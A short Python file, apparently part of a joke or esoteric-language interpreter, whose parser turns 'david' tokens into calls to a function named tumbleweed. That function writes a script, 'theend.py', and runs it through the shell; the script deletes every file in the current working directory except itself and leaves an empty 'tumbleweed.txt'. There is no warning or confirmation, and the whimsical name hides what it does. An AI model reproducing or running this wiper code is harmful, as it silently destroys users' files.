import os
import subprocess

def parseDavid(tokens):
    print("Undoing the done...")
    for i in range(len(tokens)):
        if tokens[i] == 'david\n':
            tokens[i] = 'david.tumbleweed()'
    tokens[0] = tokens[0]+'import david\n'


def tumbleweed():
	f = open("theend.py","w")
	a = "import os\nimport glob\nimport webbrowser\ncwd = os.getcwd()\nfile_path = __file__\neverything = cwd.replace('\\\\','/')+'/*.*'\nif os.path.isfile(file_path):\n\tfor CleanUp in glob.glob(everything):\n\t\tif not CleanUp.endswith(__file__):\n\t\t\tos.remove(CleanUp)\nf = open('tumbleweed.txt', 'w')\nf.close()"
	f.write(a)
	f.close()
	subprocess.call("theend.py", shell=True)
